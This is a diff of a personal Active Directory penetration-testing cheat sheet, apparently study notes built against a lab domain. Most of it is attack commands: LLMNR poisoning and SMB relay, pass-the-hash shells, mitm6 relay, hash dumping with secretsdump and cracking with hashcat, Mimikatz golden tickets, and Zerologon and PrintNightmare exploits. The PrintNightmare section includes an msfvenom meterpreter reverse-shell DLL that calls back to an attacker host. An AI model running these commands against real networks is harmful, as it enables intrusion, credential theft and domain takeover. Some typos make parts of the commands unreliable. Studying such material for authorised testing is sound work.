@@ -463,7 +463,7 @@ LLMNR Poisoning
 .          responder -I eth0 -dPv
 .          dir \\<Kali_IP>\test
 .          hashcat -m <module_number> <file.hash> rockyou2021.txt --force
-SMB Relay
+SMB Relay     (if the LLMNR attack is not working using SMB Relay attack)
 .          nmap --script=smb2-security-mode.nse -p 445 10.10.10.10     (enumeration using nmap if you get 'Message singing enabled but not required' you are good to go)
 .          run responder and turn SMB & HTTP off from /etc/responder/Responder.conf
 .          responder -I eth0 -dwPv
@@ -481,9 +481,9 @@ Getting a shell access
 use psecex.py  or   wmiexec.py  or   smbexec.py
 .          impacket-psexec -hashes NL:NTLM Administrator@<IP>
 .          psexec.py <username>:'<password>'@<IP>
-.          psexec.py <username>@<IP> -hashes <NT:NTLM>
-.          wmiexec.py <username>@<IP> -hashes <NT:NTLM>
-.          smbexec.py <username>@<IP> -hashes <NT:NTLM>
+.          psexec.py <username>@<IP> -hashes <LM:NTLM>
+.          wmiexec.py <username>@<IP> -hashes <LM:NTLM>
+.          smbexec.py <username>@<IP> -hashes <LM:NTLM>
 IPv6 Attack     If IPv6 is enabled and there is no DNS resolution in this case we can use mitm6 tool to compromise IPv6 resolution
 .          ntlmrelayx.py -6 -t ldaps://<Target_IP> -wh fakewpad.<domain ex. raman.local> -l loot
 .          mitm6 -d <domain ex. raman.local>
@@ -510,7 +510,7 @@ scenario: LLMNR -> raman hash -> crack -> sprayed the password -> found new logi
 .          use netexec if creackmapexec langing
 .          secretsdump.py raman.local/machine1:to0or@10.10.16.14 -use-vss    (dump the hashes without metasploit)
 .          secretsdump.py machine1:@10.10.16.14 -hashes <hash>     (dump the hashes without metasploit)
-.          hashcat -m <ntlm mode ex. 1000> ntlm.txt rockyou.txt     (you only need to put the NTLM portion from NT:NTLM in the ntlm.txt file)
+.          hashcat -m <ntlm mode ex. 1000> ntlm.txt rockyou.txt     (you only need to put the NTLM portion from LM:NTLM in the ntlm.txt file)
 .          crackmapexec smb <ip/CIDR> -u <user> -d raman.local -p <password>     (pass the password)
 .          crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth     (pass the hash) (only work on NTLMv1, for NTLMv2 can be relayed)
 .          crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --sam    (dump the sam database)
@@ -533,11 +533,52 @@ Mimikatz
 .          privilege::debug | token::elevate | sekurlsa::logonpasswords
 
 **Persistence**
-Golden Ticket - Mimikatz
-.          Dump the hashes using Sercretsdump.py after accessing DC
-.          You need to have the Administrator hash along with Kerbtgt.
+NTDS.dit
+.          it's a database that store AD data including (user info, group info, security descriptions, and password hashes)
+.          secretsdump.py raman.local/machine2:'Ab2002..'@10.0.2.21 -just-dc-ntlm
+.          copy the hashes and use EXCEL to take the NTLM portion only. then save the NTLM hash to txt file and use hashcat to crack the hashes
+.          hashcat -m 1000 ntds.txt rockyou.txt --show
+Golden Ticket using Mimikatz
+.          Dump the hashes using Sercretsdump.py after accessing DC  OR  mimikatz.exe | lasdump::lsa /inject /name:krbtgt  
+.          you need SID of the domain & NTLM hash of kerberos.
 .          run mimikatz.exe | kerberos::golden /domain:raman.local /sid:S-1-5-21-1314456-456789-12345687 /user:Administrator:NTLM /krbtgt:NTLM /ptt
-.          For SID don't take the last portion; for Administrator&kebtgt hashes take only NTLM hash from NT:NTLM; watch nakera episode 58 FYR
+OR
+.          run mimikatz.exe | kerberos::golden /user:Administrator /domain:raman.local /sid:S-1-5-21-1314456-456789-12345687 /krbtgt:NTLM /id:<AdminID> /ptt
+.          For SID don't take the last portion; for Administrator&kebtgt hashes take only NTLM hash from LM:NTLM; watch nakera episode 58 FYR
+.          misc::cmd  (it will open a new cmd session with golden ticket) | dir \\machine1\c$
+OR
+.          psexec.exe \\machine1 cmd.exe (transfer psexec.exe to the machine and run it against another machine)
+
+**dangerous attack to run against AD DON'T RUN IT IN A REAL PENTEST**
+zerologon
+.          this attack will set the AD authentication to null so you can authenticate without a password then you need to reset the password of the AD
+.          https://github.com/dirkjanm/CVE-2020-1472 (exploit) | https://github.com/SecuraBV/CVE-2020-1472 (zerologon checker)
+check if the AD is vulnerable or not
+-     python3 zerologon_check.py RAMAN-DC 10.0.2.19
+run the exploit
+-     python3 cve-2020-1472.py RAMAN-DC 10.0.2.19
+for restoring the AD you need to get the new hash of the administrator 
+-     secretsdump.py -just-dc <domain ex. raman>/<domain controller ex. RAMAN-DC>\$@10.0.2.19
+then get the plain_passwrod_hex
+-     secretsdump.py administrator@10.0.2.19 -hashes <LM:NTLM>
+-     python3 restorepassword.py <DOMAIN>/DOMAIN-DC@DOMAIN-DC -target-ip <IP> -hexpass <plain_passwrod_hex>
+
+PrintNightmare
+.          https://github.com/cube0x0/CVE-2021-1675
+check if the AD is vulnerable or not
+-      rpcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR'  (if you get Print System Asynchronous Remote Protocol && Print System Remote Protocol) means it's vuln
+run the exploit
+generate the dll
+-      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=9001 -f dll > shell.dll
+setup smb file share & run the exploit
+-     smbserver.py share `pwd` -smb2support
+-     python3 CVE-2021-1675.py marvel.local/machine1:Ab2002..@10.0.2.20 '\\10.0.2.10\share\shell.dll'
+-     use multi/handler
+
+CASE STUDIES
+- Perform SMB Relay attack if NTLMv2 (from responder) hash is uncrackable -> use psexec.py or use 'smbexec.py machine2@10.0.2.21 - hashes <LM:NTLM>'
+- if you find any password run 'crackmapexec smb <ip/CIDR> -u <user> -d raman.local -p <password>' and check if you can get any access to a machine -> run secretsdump.py
+- dig down into the shares you may get a password and login somewhere using crackmapexec
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Platforms
 1. for Initial Access work on eJPT, This article and official content 
